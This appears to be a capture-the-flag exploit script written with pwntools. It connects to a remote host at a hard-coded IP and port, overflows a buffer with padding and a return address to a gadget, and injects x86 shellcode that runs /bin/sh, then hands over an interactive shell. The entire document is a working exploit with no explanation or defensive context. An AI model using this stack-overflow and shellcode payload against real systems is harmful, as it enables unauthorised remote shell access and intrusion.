from pwn import *

r = remote("104.154.106.182",3456)
e = ELF("./pwn2")

main = 0x8048548
lol = 0x8048541
jmp = 0x8048542
pr = 0x08048546

payload = "A"*(32+8+4)
payload += p32(lol)
payload += "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.sendlineafter("$ ",payload)

r.interactive()
